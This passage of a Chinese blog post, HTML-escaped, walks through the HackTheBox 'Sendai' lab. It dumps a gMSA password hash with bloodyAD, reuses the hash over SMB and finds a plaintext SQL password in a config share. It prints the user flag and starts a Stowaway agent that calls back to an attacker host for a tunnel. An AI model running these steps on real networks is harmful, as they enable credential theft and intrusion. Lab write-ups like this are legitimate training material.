+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodyAD --host $FQDN --dc-ip $ip -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; get object MGTSVC$ --attr msDS-ManagedPassword
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;mgtsvc,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Managed Service Accounts,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sendai,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;vl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:9ed35c68b88f35007aa32c14c1332ce7
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ManagedPassword.B64ENCODED: MnRup9Cfg1yniZGnzaZM2tR8RVDOaG5abV/Z3wdvLW1+fLxXtQfra+OH3WUW0BmC9J1CUi2MKYeyfuiAcS16Q9d2BflORFv8jtQc2yE3Jo5OfPDcbOeYVLn9CWNZ+inVMQrf85QHomxbSAw5U440KhKnsGlZdTZ3CJ6hUoG2eFfPT57bn5C8/xXRx8tcwgHHUuQjChrve9rIzEPDFVD41vguikVetUgArPMvHjoLjg5Z1jrYqhMYUoS22Y3OcJhABJD4HCGNoqxegpm+1a6O5fDBbN6Zhfz62b9itG9QcwLyjrglBsdZZmEAqcFs9/Jfk3ZzeWzUWUWpwwyFUQsxug&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很简单对吧，接下来看看这个用户，猎犬的信息到此中断，但是我们拥有了winrm权限&lt;/p&gt;
+&lt;h2 id=&#34;提权&#34;&gt;提权
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*Evil-WinRM* PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&amp;gt; dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Directory: C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Mode                 LastWriteTime         Length Name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----                 -------------         ------ ----
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----         7/18/2023   6:09 AM                Administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----         9/18/2025   5:21 AM                mgtsvc$
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-r---         7/11/2023  12:36 AM                Public
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----         8/18/2025   5:05 AM                sqlsvc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在本地发现了数据库用户的桌面信息，可能是下一步，但是外部没开数据库，先留意一下&lt;/p&gt;
+&lt;p&gt;看看dpapi发现没有什么信息,页面更目录下面找到user.txt&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*Evil-WinRM* PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Directory: C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Mode                 LastWriteTime         Length Name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----                 -------------         ------ ----
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----         7/11/2023   5:56 AM                config
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----         4/15/2025   8:20 PM                inetpub
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----          5/8/2021   1:20 AM                PerfLogs
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-r---         4/15/2025   7:51 PM                Program Files
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----         7/18/2023   6:11 AM                Program Files &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----         7/18/2023  10:31 AM                sendai
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----         7/11/2023   2:35 AM                SQL2019
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-r---         9/18/2025   5:21 AM                Users
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d-----         8/18/2025   5:04 AM                Windows
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a----         4/15/2025   8:27 PM             &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*Evil-WinRM* PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fff335936142d21a6fa44123b897cd3e
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看看smb有无额外信息&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nxc smb $ip -u $user1 -H $hash1 --shares
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;20348&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domin:sendai.vl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Null Auth:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\M&lt;/span&gt;GTSVC$:9ed35c68b88f35007aa32c14c1332ce7 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumerated shares
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               Share           Permissions     Remark
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               -----           -----------     ------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               ADMIN$                          Remote Admin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               C$                              Default share
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               config          READ,WRITE      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               IPC$            READ            Remote IPC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               NETLOGON        READ            Logon server share 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               sendai          READ,WRITE      company share
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               SYSVOL          READ            Logon server share 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               Users           READ            
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;多出来了一个config日志可写可读，打开看一看发现是数据库密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ smbclient -U $user1 --pw-nt-hash //$ip/config $hash1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Try &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .                                   D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Thu Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:43:26 &lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ..                                DHS        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 22:55:42 &lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .sqlconfig                          A       &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:57:11 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#ae81ff&#34;&gt;7019007&lt;/span&gt; blocks of size 4096. &lt;span style=&#34;color:#ae81ff&#34;&gt;1187661&lt;/span&gt; blocks available
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; get .sql*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NT_STATUS_OBJECT_NAME_INVALID opening remote file &lt;span style=&#34;color:#ae81ff&#34;&gt;\.&lt;/span&gt;sql*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; get .sqlconfig
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;getting file &lt;span style=&#34;color:#ae81ff&#34;&gt;\.&lt;/span&gt;sqlconfig of size &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; as .sqlconfig &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.2 KiloBytes/sec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;average 0.2 KiloBytes/sec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; exit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat .sqlconfig 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;dc.sendai.vl,1433;Database&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;prod;User Id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sqlsvc;Password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SurenessBlob85;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;没有对外开，所以传stowawy上去做个sock隧道&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*Evil-WinRM* PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\m&lt;/span&gt;gtsvc$&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; ./windows_x64_agent.exe -c 10.10.16.23:443 -s &lt;span style=&#34;color:#ae81ff&#34;&gt;123456&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;windows_x64_agent.exe : 2025/09/18 05:53:41 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting agent node actively.Connecting to 10.10.16.23:443
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    + CategoryInfo          : NotSpecified: &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2025/09/18 05:5...10.10.16.23:443:String&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;, RemoteException
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    + FullyQualifiedErrorId : NativeCommandError
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tools/ad-tools/proxy/stowaway&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ ./linux_x64_admin -l 0.0.0.0:443 -s &lt;span style=&#34;color:#ae81ff&#34;&gt;123456&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting admin node on port 0.0.0.0:443
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    .-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)    .-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; _                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\ .-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; /&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  (&amp;#39;&lt;/span&gt;-.      &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\ .-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; /&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  (&amp;#39;&lt;/span&gt;-.                 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; OO &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;  OO&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.( OO ),&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; OO &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.-.   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.( OO ),&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; OO &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.-.             
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;---&lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;/     &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;._  .-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,-----. ,--./  .--.   / . --. /,--./  .--.   / . --. /  ,--.   ,--.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   /    _ | |&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--...__)( OO&amp;#39;&lt;/span&gt;  .-.  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|      |  |   | \-.  \ |      |  |   | \-.  \    \  &amp;#39;&lt;/span&gt;.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  / 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   \  :&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;. &amp;#39;&lt;/span&gt;--.  .--&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/   |  | |  ||  |   |  |,.-&amp;#39;&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  |  ||  |   |  |,.-&amp;#39;&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  |  | .-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;     /  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;..&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;   |  |   &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; |  |&lt;span style=&#34;color:#ae81ff&#34;&gt;\|&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;  |.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.|  |_)\| |_.&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;  |.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.|  |_)\| |_.&amp;#39;&lt;/span&gt;  |&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;OO  &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;  /   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   .-._&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;  |  |     &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;|  | |  &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;         |   |  .-.  &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;         |   |  .-.  | |   /  /&lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;      /   |  |      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|   ,&amp;#39;&lt;/span&gt;.   |   |  | |  &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;   ,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.   |   |  | |  | &amp;#39;&lt;/span&gt;-./  /.__&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
